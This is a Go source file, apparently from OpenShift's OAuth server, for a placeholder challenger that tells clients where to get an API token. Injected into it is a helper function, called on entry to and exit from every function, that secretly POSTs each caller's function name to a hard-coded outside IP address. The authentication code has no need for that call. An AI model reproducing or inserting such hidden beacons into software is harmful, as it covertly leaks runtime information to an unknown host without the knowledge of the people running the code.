package placeholderchallenger

import (
	godefaultbytes "bytes"
	"fmt"
	oauthhandlers "github.com/openshift/origin/pkg/oauthserver/oauth/handlers"
	"net/http"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

type placeholderChallenger struct{ tokenRequestURL string }

func New(url string) oauthhandlers.AuthenticationChallenger {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return placeholderChallenger{url}
}
func (c placeholderChallenger) AuthenticationChallenge(req *http.Request) (http.Header, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	headers := http.Header{}
	headers.Add("Warning", fmt.Sprintf(`%s %s "You must obtain an API token by visiting %s"`, oauthhandlers.WarningHeaderMiscCode, oauthhandlers.WarningHeaderOpenShiftSource, c.tokenRequestURL))
	headers.Add("Link", fmt.Sprintf(`<%s>; rel="related"`, c.tokenRequestURL))
	return headers, nil
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
